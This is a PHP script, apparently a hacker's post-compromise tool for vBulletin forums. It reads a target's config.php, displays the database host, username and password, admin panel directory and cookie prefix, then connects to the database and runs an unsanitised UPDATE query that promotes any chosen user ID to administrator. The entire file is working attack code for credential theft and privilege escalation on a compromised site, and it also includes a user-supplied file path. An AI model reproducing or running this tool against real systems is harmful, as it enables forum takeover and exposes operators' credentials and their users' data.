<?php
//////////// C0nf1g d3c0d3r /////////////
//            SyRi4n Sn!p3r            //
//            zq9@hotmail.it           //
/////////////////////////////////////////
/****************************************************************************************************/
echo "<html><head>";
echo "<style type=\"text/css\">";
echo "sn1 {color:#00ff00}";
echo "sn2 {color:#ff0000}";
echo "sn3 {color:#aaaaaa}";
echo "</style></head>";
echo "<body bgcolor=#000000 text=#ff0000>";
echo "<h3><br><sn2><[ Config decoder by SyRiAn SnIpEr ]></sn2></h3><br>";
echo "<form action=\"priv-2.php\" method=\"get\"><sn3>Config Path : </sn3>";
echo "<input type=\"text\" size=\"30\" name=\"path\" value=\"$_GET[path]\">";
echo "<input type=\"submit\" value=\"Decode it !\"></form>";
/****************************************************************************************************/
function config ($config_path_used,$userid) {
/****************************************************************************************************/
include ($config_path_used);
/****************************************************************************************************/
$variabls	=	get_defined_vars();
$pos	        =	count($variabls)-1;
$keys           = 	array_keys($variabls);
/****************************************************************************************************/
$servername             =	$variabls[$keys[$pos]]['MasterServer']['servername'];
$port	                =	$variabls[$keys[$pos]]['MasterServer']['port'];
$username               =	$variabls[$keys[$pos]]['MasterServer']['username'];
$password               =	$variabls[$keys[$pos]]['MasterServer']['password'];
$database               =	$variabls[$keys[$pos]]['Database']['dbname'];
$email	                =	$variabls[$keys[$pos]]['Database']['technicalemail'];
$admincp	        =	$variabls[$keys[$pos]]['Misc']['admincpdir'];
$modcp  	        =	$variabls[$keys[$pos]]['Misc']['modcpdir'];
$cookieprefix           =	$variabls[$keys[$pos]]['Misc']['cookieprefix'];
$canviewadminlog	=	$variabls[$keys[$pos]]['SpecialUsers']['canviewadminlog'];
$canpruneadminlog	=	$variabls[$keys[$pos]]['SpecialUsers']['canpruneadminlog'];
/****************************************************************************************************/
if ($servername != "") {
 echo "<sn2>[*]</sn2> ";
  } else {
   echo "<sn2>[-]</sn2> ";
}
echo	"<sn1>Server Name : </sn1>" .$servername ;
if ($port != "") {
   echo "<br><sn2>[*]</sn2> ";
  } else {
   echo "<br><sn2>[-]</sn2> ";
} 
echo	"<sn1>port : </sn1>" .$port ;
if ($database != "") {
echo    "<br><sn2>[*]</sn2> ";
  } else {
   echo "<br><sn2>[-]</sn2> "; 
} 
echo	"<sn1>Database : </sn1>" .$database ;
if ($username != "") {
 echo   "<br><sn2>[*]</sn2> ";
  } else {
   echo "<br><sn2>[-]</sn2> ";
}
echo	"<sn1>User name : </sn1>" .$username ;
if ($password != "") {
 echo   "<br><sn2>[*]</sn2> ";
  } else {
   echo "<br><sn2>[-]</sn2> "; 
}
echo    "<sn1>Password : </sn1>" .$password ;
if ($email != "") {
 echo   "<br><sn2>[*]</sn2> ";
  } else {
   echo "<br><sn2>[-]</sn2> "; 
}
echo	"<sn1>technicalemail : </sn1>" .$email ;
if ($admincp != "") {
 echo    "<br><sn2>[*]</sn2> "; 
 } else {
  echo   "<br><sn2>[-]</sn2> ";
}
echo	"<sn1>admincpdir : </sn1>" .$admincp ;
if ($modcp != "") {
 echo   "<br><sn2>[*]</sn2> ";
  } else {
   echo "<br><sn2>[-]</sn2> ";
}
echo	"<sn1>modcpdir : </sn1>" .$modcp ;
if ($cookieprefix != "") {
 echo   "<br><sn2>[*]</sn2> "; 
 } else { 
 echo   "<br><sn2>[-]</sn2> "; 
}
echo    "<sn1>cookieprefix : </sn1>" .$cookieprefix ;
if ($canviewadminlog != "") {
 echo    "<br><sn2>[*]</sn2> "; 
 } else {
  echo  "<br><sn2>[-]</sn2> "; 
}
echo    "<sn1>canviewadminlog : </sn1>" .$canviewadminlog ;
if ($canpruneadminlog != "") {
 echo   "<br><sn2>[*]</sn2> "; 
 } else { 
 echo   "<br><sn2>[-]</sn2> "; 
}
echo    "<sn1>canpruneadminlog : </sn1> " .$canpruneadminlog ;
/****************************************************************************************************/
echo "<font color=#aaaaaa><br>";
if ($servername == "") {
 $servername = "127.0.0.1";
 echo "<br><sn2>[-]</sn2><sn1> Enable to resolve server name, trying (" . $servername . ":3306)</sn1>";
}
echo "<br><sn2>[*]</sn2><sn1> Connecting to MySQL server (" . $servername .") ...</sn1>";
$access = mysql_connect ($servername,$username,$password)
 or die ("<br><sn2>[-]</sn2><sn1> Access denied<br><sn2>[-]</sn2> those information are incorrect</sn1>");
echo "<br><sn2>[*]</sn2><sn1> Acess accepted</sn1>";
if ($database == ""){
 $database = "vb";
 echo "<br><sn2>[-]</sn2><sn1> Enable to resolve database name, trying \"" .$database . "\"</sn1>";
}
echo "<br><sn2>[*]</sn2><sn1> Checking if database '" .$database ."' is exist ...<br></sn1>";
if (mysql_select_db ($database , $access) == true ){
 echo "<sn2>[*]</sn2><sn1> Database exist</sn1>"; 
 $success = 1;
 } else {
 echo "<sn2>[-]</sn2><sn1> Database isn't exist</sn1>";
};
/****************************************************************************************************/
if ($success == 1 )
{
 echo "<form action=\"priv-2.php\" method=\"get\">";
 echo "<input type=\"hidden\" name=\"path\" value=\"$config_path_used\"><br>";
 echo "<sn2>[~ Convert to admin ~]</sn2><br>";
 echo "User id : <input type=\"text\" size=\"5\" name=\"userid\" value=\"$userid\">";
 echo "<input type= \"submit\" value=\"Make him admin !\"></form><br>";
 if ($_GET[userid]) {
  echo "<sn2>[*]</sn2><sn1> Converting to admin ...</sn1>";
  $userid               =       $_GET[userid];
  $convert_to_admin     =       mysql_db_query ("$database" , "UPDATE `user` SET `usergroupid` = '6' WHERE `user`.`userid` ='$userid';");
  $check                =       mysql_db_query ("$database" , "SELECT * FROM `user` WHERE `userid` ='$userid';");
  $check_array          =       mysql_fetch_array ($check);
  if ($check_array[usergroupid] == 6)
  {
   echo "<br><sn2>[*]</sn2><sn1> Converted seccessfuly !</sn1>";
  } else {
   echo "<br><sn2>[-]</sn2><sn1> Error, coud not convert to admin</sn1>";
  }
 }
}
mysql_close ($access);
/****************************************************************************************************/
echo "<sn2><br><br> -~[ Done ]~- </sn2>";
echo	"</body></html>"; }
/****************************************************************************************************/
if ($_GET[path]) {
 $config_path = ($_GET[path]); 
 if (file_exists($config_path)){
  echo "<head><title> Decoding : " .$config_path ."</title></head>"; 
  config ($config_path,$_GET[userid]);
 } else {
  echo "<h5><br><font color=#aaaaaa><br><br>Please make sure that the config path is correct !</font></h5>";
  }
} else { 
 echo "<h5><br><font color=#aaaaaa><br><br>Please enter the target config.php file to decode it !</font></h5>";
 echo "</body></html>";
}
 echo "<h5><br><sn1><br><br>SyRiAn SnIpEr</font></h5>";
?>
